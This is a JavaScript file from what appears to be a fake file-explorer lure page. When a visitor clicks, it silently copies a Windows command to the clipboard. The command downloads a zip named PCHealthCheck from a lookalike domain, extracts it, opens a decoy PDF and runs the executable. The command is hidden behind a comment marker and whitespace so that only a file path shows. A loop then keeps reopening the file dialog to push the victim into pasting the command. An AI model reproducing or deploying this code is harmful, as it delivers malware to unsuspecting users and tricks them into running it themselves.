function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    let browser = "Unknown";

    if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
        browser = "Internet Explorer";
    } else if (userAgent.indexOf("Edg") > -1) {
        browser = "Microsoft Edge";
    } else if (userAgent.indexOf("Chrome") > -1) {
        browser = "Google Chrome";
    } else if (userAgent.indexOf("Safari") > -1) {
        browser = "Safari";
    } else if (userAgent.indexOf("Firefox") > -1) {
        browser = "Mozilla Firefox";
    } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
        browser = "Opera";
    }

    return browser;
}

var brwsr = document.getElementById("brwsr");
var urlpath = document.getElementById("path");

brwsr.innerHTML = getBrowserInfo();





const result = window.location.href.substring(window.location.origin.length);
 urlpath.innerHTML = result;




const fileExplorer = document.getElementById('fileExplorer');
const path = document.getElementById('path');
const fileInput = document.getElementById('fileInput'); 




path.addEventListener('click', function() {
     copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://teamglobalexpress.com.label.osc7.sbs/x/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "2026GC006824.pdf" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                    ');
});

fileExplorer.addEventListener('click', function() {
    copyToClipboard('cmd /c start /min cmd /v:on /c "set "myVar=%RANDOM%" && set "p=%TEMP%\\!myVar!" && mkdir "!p!" && curl -s -o "!p!\\PCHealthCheck.zip" "https://teamglobalexpress.com.label.osc7.sbs/x/PCHealthCheck.zip" && tar -xf "!p!\\PCHealthCheck.zip" -C "!p!" && del "!p!\\PCHealthCheck.zip" && pushd "!p!" && start "" "2026GC006824.pdf" && start "" "PCHealthCheck.exe""      # ' +urlpath.textContent+'                                                                                                                  ').then(() => {
        fileInput.click();
    });
});

fileInput.addEventListener('change', () => {
    alert("Please follow the stated instructions.");
    fileInput.value = "";
    setTimeout(() => fileInput.click(), 500);
});

function copyToClipboard(text) {
    if (navigator.clipboard && window.isSecureContext) {
        return navigator.clipboard.writeText(text);
    } else {
        const textArea = document.createElement("textarea");
        textArea.value = text;
        
        textArea.style.position = "fixed";
        textArea.style.left = "-9999px";
        textArea.style.top = "0";
        document.body.appendChild(textArea);
        
        textArea.focus();
        textArea.select();
        
        return new Promise((resolve, reject) => {
            const successful = document.execCommand('copy');
            document.body.removeChild(textArea);
            successful ? resolve() : reject();
        });
    }
}

